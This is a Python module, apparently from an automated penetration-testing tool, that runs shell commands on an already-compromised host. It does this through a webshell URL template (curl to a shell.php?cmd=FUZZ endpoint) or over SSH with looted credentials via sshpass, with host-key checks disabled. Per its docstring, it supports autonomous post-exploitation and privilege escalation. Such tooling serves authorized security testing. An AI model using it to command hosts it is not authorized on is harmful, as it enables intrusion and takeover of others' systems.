"""Foothold session — a command-execution channel to an already-compromised host.

The recon/enum tools run as argv (no shell) against *untrusted* targets. A session
is different: it runs shell commands on a host you have ALREADY compromised and are
authorized to be on (a webshell, or SSH with looted creds). That is the channel the
autonomous post-exploitation phase drives to enumerate and escalate privileges.

Two kinds:
- **WebshellSession** — a URL template with a ``FUZZ`` marker where the (URL-encoded)
  command goes, e.g. ``http://host/shell.php?cmd=FUZZ``. Runs via curl.
- **SshSession** — user + password (via sshpass) or key, runs the command over ssh.

Both take an injectable ``runner(argv) -> (returncode, stdout, stderr)`` for tests.
A session is created only for a host already in scope (the CLI enforces that), and
every command it runs is written to the audit log.
"""

from __future__ import annotations

import json
import subprocess
from abc import ABC, abstractmethod
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import quote, urlparse

FUZZ = "FUZZ"


def _default_runner(argv: list[str], timeout: float) -> tuple[int, str, str]:  # pragma: no cover
    try:
        p = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"
    except OSError as exc:
        return -1, "", str(exc)


@dataclass
class Session(ABC):
    host: str

    @abstractmethod
    def _argv(self, command: str) -> list[str]:
        """Build the argv that executes `command` on the foothold."""

    def run(self, command: str, *, timeout: float = 30.0, runner=None) -> str:
        runner = runner or _default_runner
        _code, out, err = runner(self._argv(command), timeout)
        return out if out else err

    @abstractmethod
    def to_dict(self) -> dict: ...

    # --- persistence --------------------------------------------------------
    @staticmethod
    def load(path: Path) -> Session | None:
        try:
            d = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            return None
        return Session.from_dict(d)

    def save(self, path: Path) -> None:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(self.to_dict(), indent=2), encoding="utf-8")

    @staticmethod
    def from_dict(d: dict) -> Session | None:
        kind = d.get("kind")
        if kind == "webshell":
            return WebshellSession(host=d["host"], template=d["template"])
        if kind == "ssh":
            return SshSession(host=d["host"], user=d["user"],
                              password=d.get("password", ""), key=d.get("key", ""),
                              port=d.get("port", 22))
        return None


@dataclass
class WebshellSession(Session):
    template: str = ""      # contains FUZZ where the URL-encoded command goes

    def _argv(self, command: str) -> list[str]:
        url = self.template.replace(FUZZ, quote(command, safe=""))
        return ["curl", "-s", "--max-time", "30", url]

    def to_dict(self) -> dict:
        return {"kind": "webshell", "host": self.host, "template": self.template}

    @classmethod
    def from_spec(cls, spec: str) -> WebshellSession:
        """`http://host/shell.php?cmd=FUZZ` -> a session (host parsed from the URL)."""
        if FUZZ not in spec:
            raise ValueError("webshell URL must contain a FUZZ marker for the command")
        host = urlparse(spec).hostname or ""
        return cls(host=host, template=spec)


@dataclass
class SshSession(Session):
    user: str = ""
    password: str = ""
    key: str = ""           # path to a private key (used instead of password)
    port: int = 22

    def _argv(self, command: str) -> list[str]:
        opts = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ConnectTimeout=8", "-p", str(self.port)]
        if self.key:
            return ["ssh", *opts, "-i", self.key, f"{self.user}@{self.host}", command]
        # sshpass feeds the password so the run is non-interactive.
        return ["sshpass", "-p", self.password, "ssh", *opts,
                f"{self.user}@{self.host}", command]

    def to_dict(self) -> dict:
        return {"kind": "ssh", "host": self.host, "user": self.user,
                "password": self.password, "key": self.key, "port": self.port}

    @classmethod
    def from_spec(cls, spec: str) -> SshSession:
        """`user:pass@host[:port]` -> a session."""
        creds, _, hostpart = spec.partition("@")
        if not hostpart:
            raise ValueError("ssh spec must be user:pass@host[:port]")
        user, _, password = creds.partition(":")
        host, _, port = hostpart.partition(":")
        return cls(host=host, user=user, password=password, port=int(port) if port else 22)
